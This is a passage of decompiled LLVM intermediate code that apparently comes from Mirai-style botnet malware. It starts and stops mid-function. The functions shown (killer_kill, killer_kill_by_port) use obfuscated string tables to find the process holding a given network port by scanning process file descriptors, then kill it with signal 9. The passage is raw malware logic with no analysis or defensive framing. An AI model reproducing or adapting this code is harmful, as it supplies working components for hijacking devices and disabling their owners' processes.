  br i1 %v4_10005934, label %dec_label_pc_1000593c, label %dec_label_pc_1000592c

dec_label_pc_1000593c:                            ; preds = %dec_label_pc_1000592c, %dec_label_pc_100058f8
  %v0_1000593c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000593c = urem i32 %v0_1000593c, 65536
  %v1_10005940 = xor i32 %v1_1000593c, 65535
  ret i32 %v1_10005940

dec_label_pc_10005948:                            ; preds = %dec_label_pc_100058f4.dec_label_pc_10005948_crit_edge, %dec_label_pc_100058f4.loopexit
  %v0_10005948 = phi i32 [ %v1_100058e4, %dec_label_pc_100058f4.loopexit ], [ %v0_10005948.pre, %dec_label_pc_100058f4.dec_label_pc_10005948_crit_edge ]
  %v0_1000594c10 = phi i32 [ %v2_100058ec, %dec_label_pc_100058f4.loopexit ], [ 0, %dec_label_pc_100058f4.dec_label_pc_10005948_crit_edge ]
  %v1_10005948 = inttoptr i32 %v0_10005948 to i8*
  %v2_10005948 = load i8, i8* %v1_10005948, align 1
  %v3_10005948 = zext i8 %v2_10005948 to i32
  store i32 %v3_10005948, i32* %r0.global-to-local, align 4
  %v2_1000594c = add i32 %v3_10005948, %v0_1000594c10
  br label %dec_label_pc_100058f8

dec_label_pc_1000595c:                            ; preds = %dec_label_pc_100058c0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100058dc.preheader

; uselistorder directives
  uselistorder i32 %v1_10005934, { 1, 0 }
  uselistorder i32 %v1_100058f0, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %arg3, { 3, 0, 2, 1 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000592c, { 1, 0 }
  uselistorder label %dec_label_pc_100058f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100058dc, { 1, 0 }
}

define i32 @killer_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000597c = load i32, i32* @global_var_100211e8.92, align 4
  store i32 268458372, i32* @lr, align 4
  %v2_10005980 = call i32 @kill(i32 %v3_1000597c, i32 9)
  ret i32 %v2_10005980
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-8792 = alloca i32, align 4
  %stack_var_-8760 = alloca i8, align 1
  %stack_var_-8776 = alloca i8, align 1
  %stack_var_-4151 = alloca i32, align 4
  %stack_var_-8247 = alloca i32, align 4
  %v0_100059a4 = load i32, i32* @r27, align 4
  %v2_100059a8 = ptrtoint i32* %stack_var_-8247 to i32
  store i32 %v2_100059a8, i32* @r27, align 4
  %v2_100059b0 = ptrtoint i32* %stack_var_-4151 to i32
  %v0_100059b4 = load i32, i32* @r29, align 4
  store i32 %arg1, i32* @r29, align 4
  %v2_100059c8 = ptrtoint i8* %stack_var_-8776 to i32
  store i32 %v2_100059c8, i32* %r25.global-to-local, align 4
  %v2_100059d0 = ptrtoint i8* %stack_var_-8760 to i32
  store i32 %v2_100059d0, i32* @r30, align 4
  %v0_100059d4 = load i32, i32* @r31, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  %v0_100059dc = load i32, i32* @r22, align 4
  %v0_100059e0 = load i32, i32* @r23, align 4
  %v0_100059e8 = load i32, i32* @r28, align 4
  store i32 268458480, i32* @lr, align 4
  %v3_100059ec = call i32 @__GI_memset(i32 %v2_100059a8, i32 0, i32 4096)
  store i32 268458496, i32* @lr, align 4
  %v3_100059fc = call i32 @__GI_memset(i32 %v2_100059b0, i32 0, i32 4096)
  store i32 268458512, i32* @lr, align 4
  %v3_10005a0c = call i32 @__GI_memset(i32 %v2_100059d0, i32 0, i32 513)
  %v0_10005a18 = load i32, i32* @r29, align 4
  %v0_10005a1c = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10005a1c, i32* %stack_var_-8792, align 4
  %v3_10005a2c = trunc i32 %v0_10005a18 to i8
  %v4_10005a2c = call i32 @util_itoa(i8 %v3_10005a2c, i32 16, i32 %v2_100059c8)
  store i32 268458552, i32* @lr, align 4
  %v2_10005a34 = call i32 @util_strlen(i8* nonnull %stack_var_-8776)
  %v3_10005a38 = icmp eq i32 %v2_10005a34, 2
  br i1 %v3_10005a38, label %dec_label_pc_10005f90, label %dec_label_pc_10005a40

dec_label_pc_10005a40:                            ; preds = %entry, %dec_label_pc_10005f90
  store i32 0, i32* @r31, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005a4c.93 to i32), i32* @lr, align 4
  %v1_10005a48 = call i32 @table_unlock_val(i32 6)
  store i32 ptrtoint ([3 x i8]* @global_var_10005a54.94 to i32), i32* @lr, align 4
  %v1_10005a50 = call i32 @table_unlock_val(i32 7)
  store i32 ptrtoint ([3 x i8]* @global_var_10005a5c.95 to i32), i32* @lr, align 4
  %v1_10005a58 = call i32 @table_unlock_val(i32 8)
  store i32 268458596, i32* @lr, align 4
  %v1_10005a60 = call i32 @table_unlock_val(i32 9)
  %v3_10005a6c = call i32 @table_retrieve_val(i32 9, i32* null)
  store i32 %v3_10005a6c, i32* @r3, align 4
  %v2_10005a78 = call i32 @__libc_open(i32 %v3_10005a6c, i32 0)
  %v3_10005a7c = icmp eq i32 %v2_10005a78, -1
  store i32 %v2_10005a78, i32* @r28, align 4
  br i1 %v3_10005a7c, label %dec_label_pc_10005ec8, label %dec_label_pc_10005a88

dec_label_pc_10005a88:                            ; preds = %dec_label_pc_10005a40
  %v2_10005a88 = ptrtoint i32* %stack_var_-8792 to i32
  store i32 %v2_10005a88, i32* %r26.global-to-local, align 4
  store i32 268458652, i32* @lr, align 4
  %v4_10005a9895 = call i32 @util_fdgets(i8* nonnull %stack_var_-8760, i32 512, i32 %v2_10005a78)
  %v3_10005a9c98 = icmp eq i32 %v4_10005a9895, 0
  br i1 %v3_10005a9c98, label %dec_label_pc_10005c3c.loopexit, label %dec_label_pc_10005aa4

dec_label_pc_10005aa4:                            ; preds = %dec_label_pc_10005a88, %dec_label_pc_10005a8c.backedge
  %v3_10005aa4 = load i8, i8* %stack_var_-8760, align 1
  %v3_10005aa8 = icmp eq i8 %v3_10005aa4, 0
  br i1 %v3_10005aa8, label %dec_label_pc_10005a8c.backedge, label %dec_label_pc_10005ab0

dec_label_pc_10005a8c.backedge:                   ; preds = %dec_label_pc_10005ac4, %dec_label_pc_10005aa4, %dec_label_pc_10005b2c, %dec_label_pc_10005bc4, %dec_label_pc_10005c10
  %v0_10005a94.pre = load i32, i32* @r28, align 4
  store i32 268458652, i32* @lr, align 4
  %v4_10005a98 = call i32 @util_fdgets(i8* nonnull %stack_var_-8760, i32 512, i32 %v0_10005a94.pre)
  %v3_10005a9c = icmp eq i32 %v4_10005a98, 0
  br i1 %v3_10005a9c, label %dec_label_pc_10005c3c.loopexit, label %dec_label_pc_10005aa4

dec_label_pc_10005ab0:                            ; preds = %dec_label_pc_10005aa4
  %v3_10005ab0 = icmp eq i8 %v3_10005aa4, 58
  store i32 3, i32* @r31, align 4
  br i1 %v3_10005ab0, label %dec_label_pc_10005ae4, label %dec_label_pc_10005ac0

dec_label_pc_10005ac0:                            ; preds = %dec_label_pc_10005ab0
  %v1_10005ac8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10005ac4

dec_label_pc_10005ac4:                            ; preds = %dec_label_pc_10005ad8, %dec_label_pc_10005ac0
  %v0_10005ac4 = phi i32 [ %v1_10005ac4, %dec_label_pc_10005ad8 ], [ 0, %dec_label_pc_10005ac0 ]
  %v1_10005ac4 = add i32 %v0_10005ac4, 1
  %v2_10005ac8 = add i32 %v1_10005ac4, %v1_10005ac8.pre
  %v3_10005ac8 = inttoptr i32 %v2_10005ac8 to i8*
  %v4_10005ac8 = load i8, i8* %v3_10005ac8, align 1
  %v3_10005acc = icmp eq i8 %v4_10005ac8, 0
  br i1 %v3_10005acc, label %dec_label_pc_10005a8c.backedge, label %dec_label_pc_10005ad8

dec_label_pc_10005ad8:                            ; preds = %dec_label_pc_10005ac4
  %v3_10005ad0 = icmp eq i8 %v4_10005ac8, 58
  br i1 %v3_10005ad0, label %dec_label_pc_10005adc, label %dec_label_pc_10005ac4

dec_label_pc_10005adc:                            ; preds = %dec_label_pc_10005ad8
  %v1_10005adc = add i32 %v0_10005ac4, 4
  store i32 %v1_10005adc, i32* @r31, align 4
  %v1_10005ae0 = add i32 %v0_10005ac4, 3
  br label %dec_label_pc_10005ae4

dec_label_pc_10005ae4:                            ; preds = %dec_label_pc_10005ab0, %dec_label_pc_10005adc
  %v1_10005b34 = phi i32 [ 2, %dec_label_pc_10005ab0 ], [ %v1_10005ae0, %dec_label_pc_10005adc ]
  %v0_10005ae4 = load i32, i32* %r26.global-to-local, align 4
  %v2_10005ae4 = add i32 %v0_10005ae4, %v1_10005b34
  %v1_10005ae8 = add i32 %v2_10005ae4, 32
  %v2_10005ae8 = inttoptr i32 %v1_10005ae8 to i8*
  %v3_10005ae8 = load i8, i8* %v2_10005ae8, align 1
  %v3_10005aec = icmp eq i8 %v3_10005ae8, 0
  br i1 %v3_10005aec, label %dec_label_pc_10005f28, label %dec_label_pc_10005af4

dec_label_pc_10005af4:                            ; preds = %dec_label_pc_10005ae4
  %v3_10005af4 = icmp eq i8 %v3_10005ae8, 32
  br i1 %v3_10005af4, label %dec_label_pc_10005f28, label %dec_label_pc_10005afc

dec_label_pc_10005afc:                            ; preds = %dec_label_pc_10005af4
  %v1_10005afc = add i32 %v1_10005b34, 1
  %v0_10005b04 = load i32, i32* @r30, align 4
  %v2_10005b04 = add i32 %v0_10005b04, %v1_10005afc
  br label %dec_label_pc_10005b10

dec_label_pc_10005b10:                            ; preds = %dec_label_pc_10005b10, %dec_label_pc_10005afc
  %v0_10005b14 = phi i32 [ %v1_10005b14, %dec_label_pc_10005b10 ], [ %v1_10005b34, %dec_label_pc_10005afc ]
  %v0_10005b18 = phi i32 [ %v1_10005b18, %dec_label_pc_10005b10 ], [ %v2_10005b04, %dec_label_pc_10005afc ]
  %v1_10005b10 = inttoptr i32 %v0_10005b18 to i8*
  %v2_10005b10 = load i8, i8* %v1_10005b10, align 1
  %v1_10005b14 = add i32 %v0_10005b14, 1
  %v1_10005b18 = add i32 %v0_10005b18, 1
  %tmp65 = or i8 %v2_10005b10, 32
  %tmp66 = icmp eq i8 %tmp65, 32
  br i1 %tmp66, label %dec_label_pc_10005b28, label %dec_label_pc_10005b10

dec_label_pc_10005b28:                            ; preds = %dec_label_pc_10005b10
  %v1_10005b28 = add i32 %v0_10005b14, 2
  store i32 %v1_10005b28, i32* @r31, align 4
  br label %dec_label_pc_10005b2c

dec_label_pc_10005b2c:                            ; preds = %dec_label_pc_10005f28, %dec_label_pc_10005b28
  %v0_10005b34 = phi i32 [ %v0_10005b34.pre, %dec_label_pc_10005f28 ], [ %v0_10005b04, %dec_label_pc_10005b28 ]
  %v1_10005b2c = phi i32 [ %v1_10005b34, %dec_label_pc_10005f28 ], [ %v1_10005b14, %dec_label_pc_10005b28 ]
  %v2_10005b2c = add i32 %v1_10005b2c, %v0_10005ae4
  %v2_10005b34 = add i32 %v0_10005b34, %v1_10005b34
  store i32 %v2_10005b34, i32* @r29, align 4
  %v3_10005b38 = add i32 %v2_10005b2c, 32
  %v4_10005b38 = inttoptr i32 %v3_10005b38 to i8*
  store i8 0, i8* %v4_10005b38, align 1
  %v0_10005b3c = load i32, i32* @r29, align 4
  store i32 268458820, i32* @lr, align 4
  %v1_10005b40 = inttoptr i32 %v0_10005b3c to i8*
  %v2_10005b40 = call i32 @util_strlen(i8* %v1_10005b40)
  %v0_10005b4c = load i32, i32* @r29, align 4
  %v3_10005b50 = inttoptr i32 %v0_10005b4c to i8*
  %v4_10005b50 = call i32 @util_stristr(i8* %v3_10005b50, i32 %v2_10005b40, i32 %v2_100059c8)
  %v3_10005b54 = icmp eq i32 %v4_10005b50, -1
  br i1 %v3_10005b54, label %dec_label_pc_10005a8c.backedge, label %dec_label_pc_10005b5c

dec_label_pc_10005b5c:                            ; preds = %dec_label_pc_10005b2c
  %v0_10005b5c = load i32, i32* %r26.global-to-local, align 4
  %v1_10005b5c = load i32, i32* @r31, align 4
  %v2_10005b5c = add i32 %v1_10005b5c, %v0_10005b5c
  %v1_10005b64 = add i32 %v2_10005b5c, 33
  %v2_10005b64 = inttoptr i32 %v1_10005b64 to i8*
  %v3_10005b64 = load i8, i8* %v2_10005b64, align 1
  %v4_10005b64 = zext i8 %v3_10005b64 to i32
  store i32 0, i32* @r8, align 4
  %v0_10005b70.pre = load i32, i32* @r30, align 4
  %v1_10005b6c = add i32 %v0_10005b70.pre, 2
  br label %dec_label_pc_10005b6c.outer

dec_label_pc_10005b6c.outer:                      ; preds = %dec_label_pc_10005f20, %dec_label_pc_10005b5c
  %v0_10005f0429.ph = phi i32 [ %v1_10005f08, %dec_label_pc_10005f20 ], [ 0, %dec_label_pc_10005b5c ]
  %v0_10005b9423.ph = phi i32 [ %v4_10005f14, %dec_label_pc_10005f20 ], [ %v4_10005b64, %dec_label_pc_10005b5c ]
  %v0_10005b6c.ph = phi i32 [ %v1_10005ba883, %dec_label_pc_10005f20 ], [ %v1_10005b5c, %dec_label_pc_10005b5c ]
  %v0_10005bc4.ph = phi i32 [ 1, %dec_label_pc_10005f20 ], [ 0, %dec_label_pc_10005b5c ]
  br label %dec_label_pc_10005b6c

dec_label_pc_10005b6c:                            ; preds = %dec_label_pc_10005b6c.outer, %dec_label_pc_10005f10
  %v0_10005f0429 = phi i32 [ %v1_10005f08, %dec_label_pc_10005f10 ], [ %v0_10005f0429.ph, %dec_label_pc_10005b6c.outer ]
  %v0_10005b9423 = phi i32 [ %v4_10005f14, %dec_label_pc_10005f10 ], [ %v0_10005b9423.ph, %dec_label_pc_10005b6c.outer ]
  %v0_10005b6c = phi i32 [ %v1_10005ba883, %dec_label_pc_10005f10 ], [ %v0_10005b6c.ph, %dec_label_pc_10005b6c.outer ]
  %v2_10005b70 = add i32 %v1_10005b6c, %v0_10005b6c
  %v3_10005b9475 = icmp eq i32 %v0_10005b9423, 0
  %v1_10005ba877 = add i32 %v0_10005b6c, 1
  br i1 %v3_10005b9475, label %dec_label_pc_10005bc4, label %dec_label_pc_10005bb0

dec_label_pc_10005b80:                            ; preds = %dec_label_pc_10005bb0
  br i1 %v3_10005b9882, label %dec_label_pc_10005f04, label %dec_label_pc_10005b84

dec_label_pc_10005b84:                            ; preds = %dec_label_pc_10005b80, %dec_label_pc_10005f04
  %v0_10005b84 = phi i32 [ %v1_10005f08, %dec_label_pc_10005f04 ], [ %v0_10005bb479, %dec_label_pc_10005b80 ]
  %v2_10005b84 = icmp sgt i32 %v0_10005b84, 6
  br i1 %v2_10005b84, label %dec_label_pc_10005bc4, label %dec_label_pc_10005b90

dec_label_pc_10005b90:                            ; preds = %dec_label_pc_10005bb4, %dec_label_pc_10005b84
  %v0_10005f0428 = phi i32 [ %v0_10005bb479, %dec_label_pc_10005bb4 ], [ %v0_10005b84, %dec_label_pc_10005b84 ]
  %v0_10005b9824 = phi i1 [ true, %dec_label_pc_10005bb4 ], [ false, %dec_label_pc_10005b84 ]
  %v0_10005b90 = add i32 %v0_10005bbc78, 1
  %v2_10005b90 = inttoptr i32 %v0_10005bbc78 to i8*
  %v3_10005b90 = load i8, i8* %v2_10005b90, align 1
  %v4_10005b90 = zext i8 %v3_10005b90 to i32
  %v3_10005b94 = icmp eq i8 %v3_10005b90, 0
  %v1_10005ba8 = add i32 %v1_10005ba883, 1
  br i1 %v3_10005b94, label %dec_label_pc_10005bc4, label %dec_label_pc_10005bb0

dec_label_pc_10005bb0:                            ; preds = %dec_label_pc_10005b6c, %dec_label_pc_10005b90
  %v0_10005ba880 = phi i32 [ %v1_10005ba883, %dec_label_pc_10005b90 ], [ %v0_10005b6c, %dec_label_pc_10005b6c ]
  %v1_10005ba883 = phi i32 [ %v1_10005ba8, %dec_label_pc_10005b90 ], [ %v1_10005ba877, %dec_label_pc_10005b6c ]
  %v3_10005b9882 = phi i1 [ %v0_10005b9824, %dec_label_pc_10005b90 ], [ false, %dec_label_pc_10005b6c ]
  %v0_10005b9c81 = phi i32 [ %v4_10005b90, %dec_label_pc_10005b90 ], [ %v0_10005b9423, %dec_label_pc_10005b6c ]
  %v0_10005bb479 = phi i32 [ %v0_10005f0428, %dec_label_pc_10005b90 ], [ %v0_10005f0429, %dec_label_pc_10005b6c ]
  %v0_10005bbc78 = phi i32 [ %v0_10005b90, %dec_label_pc_10005b90 ], [ %v2_10005b70, %dec_label_pc_10005b6c ]
  switch i32 %v0_10005b9c81, label %dec_label_pc_10005b80 [
    i32 32, label %dec_label_pc_10005bb4
    i32 9, label %dec_label_pc_10005bb4
  ]

dec_label_pc_10005bb4:                            ; preds = %dec_label_pc_10005bb0, %dec_label_pc_10005bb0
  %tmp67 = icmp slt i32 %v0_10005bb479, 7
  br i1 %tmp67, label %dec_label_pc_10005b90, label %dec_label_pc_10005bc4

dec_label_pc_10005bc4:                            ; preds = %dec_label_pc_10005b90, %dec_label_pc_10005b84, %dec_label_pc_10005bb4, %dec_label_pc_10005b6c
  %v0_10005ba8.lcssa = phi i32 [ %v0_10005b6c, %dec_label_pc_10005b6c ], [ %v0_10005ba880, %dec_label_pc_10005bb4 ], [ %v0_10005ba880, %dec_label_pc_10005b84 ], [ %v1_10005ba883, %dec_label_pc_10005b90 ]
  %v1_10005ba8.lcssa = phi i32 [ %v1_10005ba877, %dec_label_pc_10005b6c ], [ %v1_10005ba883, %dec_label_pc_10005bb4 ], [ %v1_10005ba883, %dec_label_pc_10005b84 ], [ %v1_10005ba8, %dec_label_pc_10005b90 ]
  %v3_10005bc4 = icmp eq i32 %v0_10005bc4.ph, 0
  br i1 %v3_10005bc4, label %dec_label_pc_10005a8c.backedge, label %dec_label_pc_10005bd0

dec_label_pc_10005bd0:                            ; preds = %dec_label_pc_10005bc4
  %v2_10005bd0 = add i32 %v1_10005ba8.lcssa, %v0_10005b5c
  %v1_10005bd4 = add i32 %v2_10005bd0, 32
  %v2_10005bd4 = inttoptr i32 %v1_10005bd4 to i8*
  %v3_10005bd4 = load i8, i8* %v2_10005bd4, align 1
  %v3_10005bd8 = icmp eq i8 %v3_10005bd4, 0
  br i1 %v3_10005bd8, label %dec_label_pc_10005c10, label %dec_label_pc_10005be0

dec_label_pc_10005be0:                            ; preds = %dec_label_pc_10005bd0
  %v3_10005be0 = icmp eq i8 %v3_10005bd4, 32
  br i1 %v3_10005be0, label %dec_label_pc_10005c10, label %dec_label_pc_10005be8

dec_label_pc_10005be8:                            ; preds = %dec_label_pc_10005be0
  %v1_10005be8 = add i32 %v0_10005ba8.lcssa, 2
  %v2_10005bec = add i32 %v1_10005be8, %v0_10005b70.pre
  br label %dec_label_pc_10005bf8

dec_label_pc_10005bf8:                            ; preds = %dec_label_pc_10005bf8, %dec_label_pc_10005be8
  %v0_10005bfc = phi i32 [ %v1_10005bfc, %dec_label_pc_10005bf8 ], [ %v1_10005ba8.lcssa, %dec_label_pc_10005be8 ]
  %v0_10005c00 = phi i32 [ %v1_10005c00, %dec_label_pc_10005bf8 ], [ %v2_10005bec, %dec_label_pc_10005be8 ]
  %v1_10005bf8 = inttoptr i32 %v0_10005c00 to i8*
  %v2_10005bf8 = load i8, i8* %v1_10005bf8, align 1
  %v1_10005bfc = add i32 %v0_10005bfc, 1
  %v1_10005c00 = add i32 %v0_10005c00, 1
  %tmp68 = or i8 %v2_10005bf8, 32
  %tmp69 = icmp eq i8 %tmp68, 32
  br i1 %tmp69, label %dec_label_pc_10005c10, label %dec_label_pc_10005bf8

dec_label_pc_10005c10:                            ; preds = %dec_label_pc_10005bf8, %dec_label_pc_10005be0, %dec_label_pc_10005bd0
  %v1_10005c10 = phi i32 [ %v1_10005ba8.lcssa, %dec_label_pc_10005be0 ], [ %v1_10005ba8.lcssa, %dec_label_pc_10005bd0 ], [ %v1_10005bfc, %dec_label_pc_10005bf8 ]
  %v2_10005c10 = add i32 %v1_10005c10, %v0_10005b5c
  %v2_10005c18 = add i32 %v1_10005ba8.lcssa, %v0_10005b70.pre
  store i32 %v2_10005c18, i32* @r31, align 4
  %v3_10005c1c = add i32 %v2_10005c10, 32
  %v4_10005c1c = inttoptr i32 %v3_10005c1c to i8*
  store i8 0, i8* %v4_10005c1c, align 1
  %v0_10005c20 = load i32, i32* @r31, align 4
  store i32 268459048, i32* @lr, align 4
  %v1_10005c24 = inttoptr i32 %v0_10005c20 to i8*
  %v2_10005c24 = call i32 @util_strlen(i8* %v1_10005c24)
  %v2_10005c28 = icmp sgt i32 %v2_10005c24, 15
  br i1 %v2_10005c28, label %dec_label_pc_10005a8c.backedge, label %dec_label_pc_10005c30

dec_label_pc_10005c30:                            ; preds = %dec_label_pc_10005c10
  %v0_10005c30 = load i32, i32* @r31, align 4
  store i32 %v2_10005a88, i32* @r3, align 4
  %v2_10005c38 = bitcast i32* %stack_var_-8792 to i8*
  %v3_10005c38 = call i32 @util_strcpy(i8* %v2_10005c38, i32 %v0_10005c30)
  br label %dec_label_pc_10005c3c

dec_label_pc_10005c3c.loopexit:                   ; preds = %dec_label_pc_10005a8c.backedge, %dec_label_pc_10005a88
  %.pre = bitcast i32* %stack_var_-8792 to i8*
  br label %dec_label_pc_10005c3c

dec_label_pc_10005c3c:                            ; preds = %dec_label_pc_10005c3c.loopexit, %dec_label_pc_10005c30
  %v1_10005c48.pre-phi = phi i8* [ %.pre, %dec_label_pc_10005c3c.loopexit ], [ %v2_10005c38, %dec_label_pc_10005c30 ]
  %v0_10005c3c = load i32, i32* @r28, align 4
  store i32 %v0_10005c3c, i32* @r3, align 4
  %v0_10005c40 = call i32 @__GI___libc_close()
  store i32 268459084, i32* @lr, align 4
  %v2_10005c48 = call i32 @util_strlen(i8* %v1_10005c48.pre-phi)
  %v3_10005c4c = icmp eq i32 %v2_10005c48, 0
  br i1 %v3_10005c4c, label %dec_label_pc_10005f30, label %dec_label_pc_10005c54

dec_label_pc_10005c54:                            ; preds = %dec_label_pc_10005c3c
  %v3_10005c5c = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 268459112, i32* @lr, align 4
  %v1_10005c64 = call i32 @__GI_opendir(i32 %v3_10005c5c)
  store i32 %v1_10005c64, i32* @r23, align 4
  %v3_10005c68 = icmp eq i32 %v1_10005c64, 0
  br i1 %v3_10005c68, label %dec_label_pc_10005ea0, label %dec_label_pc_10005c70

dec_label_pc_10005c70:                            ; preds = %dec_label_pc_10005c54
  store i32 0, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_100100d0.27 to i32), i32* @r22, align 4
  store i32 268459140, i32* @lr, align 4
  %v1_10005c807 = inttoptr i32 %v1_10005c64 to i32*
  %v2_10005c808 = call i32 @__GI_readdir(i32* %v1_10005c807)
  %v3_10005c8411 = icmp eq i32 %v2_10005c808, 0
  br i1 %v3_10005c8411, label %dec_label_pc_10005e94, label %dec_label_pc_10005c8c.preheader.lr.ph

dec_label_pc_10005c8c.preheader.lr.ph:            ; preds = %dec_label_pc_10005c70
  %v2_10005cc0 = bitcast i32* %stack_var_-8247 to i8*
  %v1_10005e2c = bitcast i32* %stack_var_-4151 to i8*
  br label %dec_label_pc_10005c8c.preheader

dec_label_pc_10005c7c.loopexit:                   ; preds = %dec_label_pc_10005c94, %dec_label_pc_10005ca8, %dec_label_pc_10005d14
  %v0_10005c7c = load i32, i32* @r23, align 4
  store i32 268459140, i32* @lr, align 4
  %v1_10005c80 = inttoptr i32 %v0_10005c7c to i32*
  %v2_10005c80 = call i32 @__GI_readdir(i32* %v1_10005c80)
  %v3_10005c84 = icmp eq i32 %v2_10005c80, 0
  br i1 %v3_10005c84, label %dec_label_pc_10005e94, label %dec_label_pc_10005c8c.preheader

dec_label_pc_10005c8c.preheader:                  ; preds = %dec_label_pc_10005c8c.preheader.lr.ph, %dec_label_pc_10005c7c.loopexit
  %v0_10005c9439 = phi i32 [ %v2_10005c808, %dec_label_pc_10005c8c.preheader.lr.ph ], [ %v2_10005c80, %dec_label_pc_10005c7c.loopexit ]
  br label %dec_label_pc_10005c8c

dec_label_pc_10005c8c:                            ; preds = %dec_label_pc_10005c8c.preheader, %dec_label_pc_10005e7c
  %v0_10005cb0 = phi i32 [ %v0_10005c9439, %dec_label_pc_10005c8c.preheader ], [ %v2_10005e88, %dec_label_pc_10005e7c ]
  %v0_10005c8c = load i32, i32* @r28, align 4
  %v3_10005c8c = icmp eq i32 %v0_10005c8c, 0
  br i1 %v3_10005c8c, label %dec_label_pc_10005c94, label %dec_label_pc_10005e94

dec_label_pc_10005c94:                            ; preds = %dec_label_pc_10005c8c
  %v1_10005c94 = add i32 %v0_10005cb0, 11
  %v2_10005c94 = inttoptr i32 %v1_10005c94 to i8*
  %v3_10005c94 = load i8, i8* %v2_10005c94, align 1
  %v4_10005c94 = zext i8 %v3_10005c94 to i32
  %v1_10005c98 = add nuw nsw i32 %v4_10005c94, 208
  %v1_10005c9c = urem i32 %v1_10005c98, 256
  %v2_10005ca0 = icmp ugt i32 %v1_10005c9c, 9
  br i1 %v2_10005ca0, label %dec_label_pc_10005c7c.loopexit, label %dec_label_pc_10005ca8

dec_label_pc_10005ca8:                            ; preds = %dec_label_pc_10005c94
  store i32 %v1_10005c94, i32* %r30.global-to-local, align 4
  %v3_10005cb4 = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 %v2_100059a8, i32* @r3, align 4
  %v3_10005cc0 = call i32 @util_strcpy(i8* %v2_10005cc0, i32 %v3_10005cb4)
  store i32 268459212, i32* @lr, align 4
  %v2_10005cc8 = call i32 @util_strlen(i8* %v2_10005cc0)
  %v1_10005cd0 = load i32, i32* @r27, align 4
  %v2_10005cd0 = add i32 %v1_10005cd0, %v2_10005cc8
  store i32 %v2_10005cd0, i32* @r3, align 4
  %v2_10005cd4 = inttoptr i32 %v2_10005cd0 to i8*
  %v3_10005cd4 = call i32 @util_strcpy(i8* %v2_10005cd4, i32 %v1_10005c94)
  store i32 268459232, i32* @lr, align 4
  %v2_10005cdc = call i32 @util_strlen(i8* %v2_10005cc0)
  %v3_10005cec = call i32 @table_retrieve_val(i32 7, i32* null)
  %v1_10005cf4 = load i32, i32* @r27, align 4
  %v2_10005cf4 = add i32 %v1_10005cf4, %v2_10005cdc
  store i32 %v2_10005cf4, i32* @r3, align 4
  %v2_10005cf8 = inttoptr i32 %v2_10005cf4 to i8*
  %v3_10005cf8 = call i32 @util_strcpy(i8* %v2_10005cf8, i32 %v3_10005cec)
  store i32 268459276, i32* @lr, align 4
  %v3_10005d08 = call i32 @readlink(i32 %v2_100059a8, i32 %v2_100059b0, i32 4096)
  %v3_10005d0c = icmp eq i32 %v3_10005d08, -1
  br i1 %v3_10005d0c, label %dec_label_pc_10005c7c.loopexit, label %dec_label_pc_10005d14

dec_label_pc_10005d14:                            ; preds = %dec_label_pc_10005ca8
  %v3_10005d1c = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 %v2_100059a8, i32* @r3, align 4
  %v3_10005d28 = call i32 @util_strcpy(i8* %v2_10005cc0, i32 %v3_10005d1c)
  store i32 268459316, i32* @lr, align 4
  %v2_10005d30 = call i32 @util_strlen(i8* %v2_10005cc0)
  %v0_10005d34 = load i32, i32* %r30.global-to-local, align 4
  %v1_10005d38 = load i32, i32* @r27, align 4
  %v2_10005d38 = add i32 %v1_10005d38, %v2_10005d30
  store i32 %v2_10005d38, i32* @r3, align 4
  %v2_10005d3c = inttoptr i32 %v2_10005d38 to i8*
  %v3_10005d3c = call i32 @util_strcpy(i8* %v2_10005d3c, i32 %v0_10005d34)
  store i32 268459336, i32* @lr, align 4
  %v2_10005d44 = call i32 @util_strlen(i8* %v2_10005cc0)
  %v3_10005d54 = call i32 @table_retrieve_val(i32 8, i32* null)
  %v1_10005d5c = load i32, i32* @r27, align 4
  %v2_10005d5c = add i32 %v1_10005d5c, %v2_10005d44
  store i32 %v2_10005d5c, i32* @r3, align 4
  %v2_10005d60 = inttoptr i32 %v2_10005d5c to i8*
  %v3_10005d60 = call i32 @util_strcpy(i8* %v2_10005d60, i32 %v3_10005d54)
  store i32 268459372, i32* @lr, align 4
  %v1_10005d68 = call i32 @__GI_opendir(i32 %v2_100059a8)
  store i32 %v1_10005d68, i32* %r25.global-to-local, align 4
  %v3_10005d6c = icmp eq i32 %v1_10005d68, 0
  br i1 %v3_10005d6c, label %dec_label_pc_10005c7c.loopexit, label %dec_label_pc_10005d74

dec_label_pc_10005d74.loopexit:                   ; preds = %dec_label_pc_10005d94, %dec_label_pc_10005e2c
  %v0_10005d74.pre = load i32, i32* %r25.global-to-local, align 4
  br label %dec_label_pc_10005d74

dec_label_pc_10005d74:                            ; preds = %dec_label_pc_10005d14, %dec_label_pc_10005d74.loopexit
  %v0_10005d74 = phi i32 [ %v0_10005d74.pre, %dec_label_pc_10005d74.loopexit ], [ %v1_10005d68, %dec_label_pc_10005d14 ]
  store i32 268459388, i32* @lr, align 4
  %v1_10005d78 = inttoptr i32 %v0_10005d74 to i32*
  %v2_10005d78 = call i32 @__GI_readdir(i32* %v1_10005d78)
  store i32 4096, i32* @r4, align 4
  store i32 %v2_10005d78, i32* %r31.global-to-local, align 4
  %v3_10005d80 = icmp eq i32 %v2_10005d78, 0
  %v0_10005d84 = load i32, i32* @r28, align 4
  store i32 %v2_100059b0, i32* @r3, align 4
  %v3_10005d84.not = icmp ne i32 %v0_10005d84, 0
  %brmerge = or i1 %v3_10005d80, %v3_10005d84.not
  br i1 %brmerge, label %dec_label_pc_10005e7c, label %dec_label_pc_10005d94

